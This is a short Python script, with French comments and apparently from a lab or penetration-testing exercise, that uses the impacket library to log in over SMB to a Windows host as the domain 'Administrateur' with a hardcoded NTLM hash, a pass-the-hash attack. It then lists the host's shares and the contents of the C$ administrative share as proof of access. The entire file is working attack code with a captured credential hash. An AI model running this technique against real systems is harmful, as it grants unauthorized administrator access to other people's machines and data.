from impacket.smbconnection import SMBConnection

target = "192.168.56.30"
domain = "gstr.local"
username = "Administrateur"
lmhash = "aad3b435b51404eeaad3b435b51404ee"
nthash = "c3e9e49ecafc1f4b03c7e42a5e0379a4"

try:
    conn = SMBConnection(target, target)
    conn.login(username, "", domain, lmhash, nthash)
    print("[+] Authentification réussie avec le hash NTLM")
    print("[+] Connecté en tant que:", conn.getServerName())
    print("[+] Domaine:", conn.getServerDNSDomainName())
       # Preuve d'accès n°1 : lister les partages disponibles
    print("\n[+] Partages disponibles sur la cible :")
    shares = conn.listShares()
    for share in shares:
        share_name = share['shi1_netname'].rstrip('\x00')
        print("   -", share_name)

    # Preuve d'accès n°2 : lister le contenu du partage administratif C$
    print("\n[+] Contenu de C$ (accès administrateur confirmé) :")
    files = conn.listPath('C$', '*')
    for f in files[:10]:  # limite aux 10 premiers pour la lisibilité
        print("   -", f.get_longname())

except Exception as e:
    print("[-] Échec:", e)
